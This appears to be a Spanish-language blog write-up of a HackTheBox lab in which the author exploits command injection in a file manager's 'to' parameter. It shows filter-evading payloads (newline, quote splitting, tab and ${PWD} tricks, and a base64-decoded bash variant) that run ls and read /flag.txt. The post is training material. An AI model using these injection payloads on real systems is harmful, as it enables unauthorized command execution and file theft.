<!DOCTYPE html>
<html lang="en-us">

<head><title>
    
    Laboratorio De Command Injection | 
    
    CHL Blog
</title>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-command-injection/" />
<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">


<meta name="description" content="
    En este laboratorio exploramos una vulnerabilidad de Command Injection en una aplicación web de gestión de archivos. Mediante inyección de comandos, logramos ejecutar comandos del sistema, listar directorios y finalmente leer el contenido de la flag.
    "
/>
<meta property="og:description" content="
    En este laboratorio exploramos una vulnerabilidad de Command Injection en una aplicación web de gestión de archivos. Mediante inyección de comandos, logramos ejecutar comandos del sistema, listar directorios y finalmente leer el contenido de la flag.
    " 
/>




<meta property="og:title" content="Laboratorio de Command Injection" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-command-injection/" /><meta property="article:section" content="pagina_web" />
<meta property="article:published_time" content="2025-09-10T00:00:00+00:00" />
<meta property="article:modified_time" content="2025-09-10T00:00:00+00:00" />





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Laboratorio de Command Injection">
  <meta name="twitter:description" content="En este laboratorio exploramos una vulnerabilidad de Command Injection en una aplicación web de gestión de archivos. Mediante inyección de comandos, logramos ejecutar comandos del sistema, listar directorios y finalmente leer el contenido de la flag.">


  <meta itemprop="name" content="Laboratorio de Command Injection">
  <meta itemprop="description" content="En este laboratorio exploramos una vulnerabilidad de Command Injection en una aplicación web de gestión de archivos. Mediante inyección de comandos, logramos ejecutar comandos del sistema, listar directorios y finalmente leer el contenido de la flag.">
  <meta itemprop="datePublished" content="2025-09-10T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-09-10T00:00:00+00:00">
  <meta itemprop="wordCount" content="233">
  <meta itemprop="keywords" content="Hackthebox,File Injection">




<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">





<script src="https://chlorenzo.com/bundle.js"></script>







<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>




    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4G9W14SLG4');
</script>






</head>

<body><header id="header">
  <div class="top-bar">
    <div class="container-md">

      <div class="row align-items-center">
        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
          <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
        </div>

        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <i class="fas fa-bars"></i>
          </button>
        </div>

        <div class="col-6 col-sm-4">
          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
        </div>

        
        <div class="col-3 col-sm-4">
          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
              role="search">
              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
              <button class="btn" type="submit">
                <i class="fa fa-search"></i>
              </button>
            </form>
          </div>
        </div>
        

      </div>
    </div>
  </div>

  <div class="container-md">
    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav mx-auto">

          <li class="nav-item d-block d-sm-none">
            <ul class="social-buttons">
              <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
            </ul>
          </li>

          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/">
              Home
            </a>
          </li>
          
          
          
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
              Blog
            </a>
            <div class="dropdown-menu">
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
              
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
              
              
              
                <div class="dropdown-divider"></div>
              
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
              
              
            </div>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/pagina_web/trayectoria/">
              Trayectoria
            </a>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/pagina_web/contact/">
              Contacto
            </a>
          </li>
          
          
        </ul>

        
        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
          onsubmit="return executeQuery('xs');" role="search">
          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
          <button class="btn" type="submit">
            <i class="fa fa-search"></i>
          </button>
        </form>
        

      </div>
    </nav>
  </div>
</header>

<main class="blog-content">
    <div class="container-md">
        <div class="row">
            
            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-left-offset"></div>
                
            </div>

            <div class="col-md-12 col-lg-8 px-lg-4">
                

                <h1 class="title">Laboratorio de Command Injection</h1>

                <div class="container-fluid px-0 mb-4">
                    <div class="row align-items-end">
                        <div class="col-md-4 date-time">
                            <span class="date">
    Sep 10, 2025
</span>
                            &centerdot;
                            <span class="time-to-read">
    1 min read</span>
                        </div>

                        <div class="col-md-8 tags ">
                            
                            <a href="https://chlorenzo.com/tags/hackthebox"><span
                                    class="tag bg-dark">hackthebox</span></a>
                            
                            <a href="https://chlorenzo.com/tags/file-injection"><span
                                    class="tag bg-dark">File Injection</span></a>
                            
                        </div>
                    </div>
                </div>

                

                <p><img src="../../../../../images/Miniaturas/file_upload.pn" alt=""></p>
<h4 id="enunciado">Enunciado</h4>
<p>Le contratan para realizar una prueba de penetración para una empresa y, durante la prueba, descubre una interesante aplicación web de gestión de archivos. Dado que los gestores de archivos suelen ejecutar comandos del sistema, le interesa comprobar si existen vulnerabilidades de inyección de comandos.</p>
<p>Utilice las distintas técnicas presentadas en este módulo para detectar una vulnerabilidad de inyección de comandos y luego explotarla, evadiendo cualquier filtro existente.</p>
<ul>
<li>Autenticarse con el usuario <code>guest</code> y la contraseña <code>guest</code>.</li>
</ul>
<p><strong>¿Cuál es el contenido de &lsquo;/flag.txt&rsquo;?</strong>
Accedemos a la página web que nos ponen.
<img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-1.png" alt="">
Entramos con las credenciales que nos dan y vemos lo siguiente un administrador de archivos.
<img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-2.png" alt="">
Revisando la página vemos que la petición:
<img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-3.png" alt="">
<img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-4.png" alt="">
<img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-5.png" alt="">
Nos da un error luego de probar con diferentes comandos vemos que en el parámetro <code>to</code> es vulnerable a inyección de comandos.</p>
<p>to=<code>%0ap'w'd</code>&hellip;   -&gt; <code>/n pwd</code>
Probamos con el comando <code>pwd</code> y vemos que nos muestra la ruta actual.
<img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-6.png" alt=""></p>
<p>to=<code>%0a'l's%09${PWD:0:1}</code>&hellip;   -&gt; <code>/n ls /</code>
Listamos el contenido en <code>/</code> y vemos el archivo de la flag.</p>
<p><img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-7.png" alt=""></p>
<p>to=<code>%0a'ca't%09${PWD:0:1}flag.txt</code>&hellip;  -&gt; <code>/n cat /flag.txt</code>.
Leemos la flag.
<img src="../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-8.png" alt=""></p>
<p>Otra forma que tenemos de hacerlo es codificando los comandos en base 64 y pasárselo para que el servidor lo decodifique.</p>
<p>to=<code>%0abash&lt;&lt;&lt;$(base64%09-d&lt;&lt;&lt;Y2F0IC9mbGFnLnR4dA==)</code> -&gt; <code>/n cat /flag.txt</code></p>
<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>


                <div id="social-media-share">
	<p><i>Escríbeme por cualquiera de las vías</i></p>
	
	<div class="share-buttons">
	    
		<a href="https://www.instagram.com/19chl96/" 
   			target="_blank" 
   			title="Sígueme en Instagram">
    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
		</a>

		<a  href="https://www.linkedin.com/in/chlinked/"
	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
	        title="Share on LinkedIn. Opens in a new window." >
	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
	    </a>

	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
   		   target="_blank" 
   		   title="Enviar correo usando Gmail">
    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
		</a>

		

	</div>
</div>



                
                <br>
                <div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = '';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            </div>

            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-right-offset"></div>
                
            </div>
        </div>
    </div>
</main>

<footer class="bg-dark text-light py-4">
    <div class="container-md">
        <div class="row justify-content-center">
            <div class="col-12">
                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>
    <div class="text-center mt-3">
        <p>© 2025 Carlos Hernández Lorenzo</p>
    </div>
</footer>


<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
<gcse:searchresults-only></gcse:searchresults-only>

</body>

</html>